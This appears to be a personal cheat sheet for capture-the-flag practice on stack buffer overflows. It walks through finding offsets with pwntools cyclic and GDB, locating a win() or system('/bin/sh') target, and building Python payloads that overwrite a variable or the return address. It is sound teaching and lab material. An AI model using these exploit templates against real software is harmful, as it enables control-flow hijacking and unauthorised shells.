- A program writes **more data into a stack buffer than it can hold**, overwriting nearby stack data.
```C
char buffer[64];
gets(buffer);
```
If I send > 64 bytes ---> overflow

Typical stack layout: If I overwrite the return address I can control where the function returns
`[ buffer ]`
`[ padding ]`
`[ saved RBP ]`
`[ return address ]`  ← target

------------------------------------
## <span style="color:rgb(146, 208, 80)">The Goal:</span>
Find overflow
     ↓
Find offset (variable or RIP)
     ↓
Control RIP
     ↓
Redirect execution
     ↓
Get flag

### <span style="color:rgb(146, 208, 80)">1- Finding Offset (Variable Overwrite)</span>

- In terminal:
```bash
pwn cyclic 200 | ./binary         # pipe pattern to binary, program keeps running
# read printed variable value from output
pwn cyclic -l <value>             # outputs the offset number
```

- In Python:
```python
from pwn import *

p = process('./binary')
payload = cyclic(200)
p.send(payload)                   # send() NOT sendline() (avoid \n on lose_variable)
print(p.recvall().decode())       # read win variable value from output
offset = cyclic_find(0x????????)  # put win variable value here
```
(If there is a lose_variable, always use `p.send()` not `p.sendline()`)
-
## <span style="color:rgb(146, 208, 80)">2- Finding Offset (Return address/RIP overwrite)</span>
- In GDB:
```bash
# In GDB only:
gdb ./binary
r <<< $(pwn cyclic 200)       # run with pattern, program crashes
info registers rip            # check RIP value after crash
x/gx $rsp                    # if RIP truncated, check RSP
cyclic -l <value>             # outputs the offset number
```

- In Python:
```python
from pwn import *

payload = cyclic(200)
# after crash, check RIP value in GDB
offset = cyclic_find(0x6161616b)  # RIP value here
```
(If RIP is truncated and cyclic can't find it, check RSP instead: `x/gx $rsp`)


## <span style="color:rgb(146, 208, 80)">3- Find Target Address</span> 
```bash
# In GDB
info functions          # list all functions, find win()
p win                   # print address of win()
```
 *Common Targets to Jump To*
 - A `win()` function that prints the flag
 - `system("/bin/sh")` for a shell
 - Your shellcode (only if NX is disabled)

## <span style="color:rgb(146, 208, 80)"><span style="color:rgb(146, 208, 80)">4- Build Payload</span></span>
```python
from pwn import *

p = process("./binary")     # local
# p = remote("host", 1337)  # remote CTF

offset = 40                 # from cyclic
win    = 0xdeadbeef         # from GDB

# For variable overwrite:
payload  = b"A" * offset    # junk to reach variable
payload += p32(1)           # set win_variable = 1
p.send(payload)             # send() not sendline()!
print(p.recvall().decode())

# For return address overwrite:
payload  = b"A" * offset    # junk to reach return address
payload += p64(win)         # overwrite return address
p.sendline(payload)
p.interactive()
```

## <span style="color:rgb(146, 208, 80)">Things that go wrong:</span> 
| PROBLEM                | FIX                                        |
| ---------------------- | ------------------------------------------ |
| Offset is wrong        | Recalculate with cyclic, check RIP not RSP |
| RIP value truncated    | Use RSP instead: `x/gx $rsp`               |
| Segfault at system()   | Stack alignment issue, add `ret` gadget    |
| Address has null bytes | Find a different target address            |